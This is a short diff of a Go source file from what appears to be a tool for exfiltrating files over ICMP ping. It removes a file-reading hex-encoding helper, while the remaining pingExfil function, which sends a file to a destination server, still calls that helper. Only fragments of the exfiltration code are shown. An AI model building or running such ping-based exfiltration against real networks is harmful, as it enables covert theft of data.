@@ -1,8 +1,7 @@
 package cmd
 
 import (
-	"io/ioutil"
-	"encoding/hex"
+
 	"os"
 	"net"
 
@@ -32,16 +31,6 @@ func executePing(targetIP string, fileBytes []byte) {
     }
 }
 
-// hexEncode takes a file and dumps it to bytes. It's not meant for large files
-func hexEncode(fileName string) []byte {
-
-	dat, err := ioutil.ReadFile(fileName)
-	check(err)
-	dstEnc := make([]byte, hex.EncodedLen(len(dat)))
-	hex.Encode(dstEnc, dat)
-	return dstEnc
-
-}
 // pingExfil Sends a file over ping to a destination server
 func pingExfil(destination, fileName string) {
 	fileAsHex := hexEncode(fileName)
